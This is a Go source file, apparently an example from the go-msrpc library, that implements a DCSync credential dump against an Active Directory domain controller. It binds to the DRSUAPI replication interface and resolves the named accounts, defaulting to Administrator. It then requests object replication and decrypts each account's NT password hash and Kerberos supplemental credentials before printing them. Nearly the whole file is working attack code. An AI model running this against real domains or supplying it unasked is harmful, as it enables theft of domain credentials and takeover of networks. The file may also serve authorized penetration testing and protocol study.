//go:build exclude

// drsr is a sample for dumping the user credentials using directory service replication:

// example: go run drsr.go -names User1,Admin1,COMPUTER1$

package main

import (
	"context"
	"encoding/asn1"
	"encoding/hex"
	"flag"
	"fmt"
	"os"

	"github.com/oiweiwei/go-msrpc/midl/uuid"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/ndr"

	config "github.com/oiweiwei/go-msrpc/config"
	config_flag "github.com/oiweiwei/go-msrpc/config/flag"

	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	"github.com/oiweiwei/go-msrpc/msrpc/ad"
	"github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/msrpc/samr/samr/v1"

	"github.com/oiweiwei/go-msrpc/msrpc/erref/drsr"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"

	. "github.com/oiweiwei/go-msrpc/examples/common"
)

var (
	cfg   = config.New()
	names config.StringSlice
)

func init() {

	config_flag.BindFlags(cfg, flag.CommandLine)

	flag.Var(&names, "names", "names to crack")

}

func main() {

	if err := config_flag.ParseAndValidate(cfg, flag.CommandLine); err != nil {
		fmt.Fprintln(os.Stderr, err)
		return
	}

	if len(names) == 0 {
		fmt.Fprintln(os.Stderr, "no names provided, using Administrator")
		names = append(names, "Administrator")
	}

	ctx := gssapi.NewSecurityContext(context.Background())

	cc, err := dcerpc.Dial(ctx, cfg.ServerAddr(), cfg.DialOptions(ctx)...)
	if err != nil {
		fmt.Fprintln(os.Stderr, "dial", err)
		return
	}

	defer cc.Close(ctx)

	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, cfg.ClientOptions(ctx)...)
	if err != nil {
		fmt.Fprintln(os.Stderr, "new_drsuapi_client", err)
		return
	}

	clientCaps := drsuapi.ExtensionsInt{
		Flags: drsuapi.ExtGetNCChangesRequestV8 | drsuapi.ExtStrongEncryption | drsuapi.ExtGetNCChangesReplyV6,
	}

	b, err := ndr.Marshal(&clientCaps, ndr.Opaque)
	if err != nil {
		fmt.Fprintln(os.Stderr, "marshal_client_caps", err)
		return
	}

	resp, err := cli.Bind(ctx, &drsuapi.BindRequest{
		Client: &drsuapi.Extensions{Data: b},
	})
	if err != nil {
		fmt.Fprintln(os.Stderr, "drsuapi_bind", err)
		return
	}

	// get the id using the provided name.
	cracked, err := cli.CrackNames(ctx, &drsuapi.CrackNamesRequest{
		Handle:    resp.DRS,
		InVersion: 1,
		In: &drsuapi.MessageCrackNamesRequest{
			Value: &drsuapi.MessageCrackNamesRequest_V1{
				V1: &drsuapi.MessageCrackNamesRequestV1{
					FormatOffered: uint32(drsuapi.DSNameFormatNT4AccountNameSANSDomainEx),
					Names:         names,
					FormatDesired: uint32(drsuapi.DSNameFormatUniqueIDName),
				},
			},
		},
	})

	if err != nil {
		fmt.Fprintln(os.Stderr, "crack_names", err)
		return
	}

	items := cracked.Out.GetValue().(*drsuapi.MessageCrackNamesReplyV1).Result.Items

	for i, name := range items {

		if name.Status != 0 {
			fmt.Fprintln(os.Stderr, "unable to crack name for user", names[i], ":", drsr.FromCode(int32(name.Status)))
			continue
		}

		fmt.Fprintln(os.Stderr, "trying to get secret for user", names[i], "with guid", name.Name)

		//get the replica for object guid.
		nc, err := cli.GetNCChanges(ctx, &drsuapi.GetNCChangesRequest{
			Handle:    resp.DRS,
			InVersion: 8,
			In: &drsuapi.MessageGetNCChangesRequest{
				Value: &drsuapi.MessageGetNCChangesRequest_V8{
					V8: &drsuapi.MessageGetNCChangesRequestV8{
						MaxObjectsCount: 1,
						NC: &drsuapi.DSName{
							GUID: dtyp.GUIDFromUUID(uuid.MustParse(name.Name)),
						},
						Flags:             drsuapi.InitSync | drsuapi.GetAncestor | drsuapi.GetAllGroupMembership | drsuapi.WritableReplica,
						ExtendedOperation: drsuapi.ExtendedOperationReplicationObject,
					},
				},
			},
		})

		if err != nil {
			fmt.Fprintln(os.Stderr, err)
			return
		}

		if cfg.Debug {
			fmt.Fprintln(os.Stdout, J(nc))
		}

		reply := nc.Out.GetValue().(*drsuapi.MessageGetNCChangesReplyV6)

		prefixes := reply.PrefixTableSource.Build()

		object := map[string]interface{}{}

		for _, attr := range reply.Objects.EntityInfo.AttributeBlock.Attribute {

			oid, err := prefixes.AttributeToOID(attr.AttributeType)
			if err != nil {
				fmt.Fprintln(os.Stderr, "attribute_to_oid", err, attr.AttributeType)
				return
			}

			name, l := "", []interface{}{}

			for i := range attr.AttributeValue.Values {
				n, val, err := ad.ParseNameAndValue(oid, attr.AttributeValue.Values[i].Value, prefixes)
				if err != nil {
					fmt.Fprintln(os.Stderr, "parse name and value", err)
					return
				}

				if _, ok := val.(asn1.ObjectIdentifier); ok {
					val = val.(asn1.ObjectIdentifier).String()
				}

				name, l = n, append(l, val)
			}

			if name != "" {
				if len(l) > 1 {
					object[name] = l
				} else {
					object[name] = l[0]
				}
			}
		}

		sid, _ := object["objectSid"].(*dtyp.SID)
		rid := uint32(0)
		if sid != nil {
			rid = sid.SubAuthority[len(sid.SubAuthority)-1]
		}

		// decrypt the unicode password hash.
		if b, _ := object["unicodePwd"].([]byte); len(b) != 0 {
			pwd, err := drsuapi.DecryptHash(cli.Conn().Context(), rid, b)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				return
			}
			object["unicodePwd"] = hex.EncodeToString(pwd)
		}

		// decode the supplemental credentials (kerberos tickets).
		if b, _ := object["supplementalCredentials"].([]byte); len(b) != 0 {
			creds, err := drsuapi.DecryptData(cli.Conn().Context(), b)
			if err != nil {
				fmt.Fprintln(os.Stderr, err)
				return
			}
			props := samr.UserProperties{}
			if err := ndr.Unmarshal(creds, &props, ndr.Opaque); err != nil {
				fmt.Fprintln(os.Stderr, err)
				return
			}
			object["supplementalCredentials"] = props
		}

		// print.
		fmt.Fprintln(os.Stdout, J(object))
	}
}
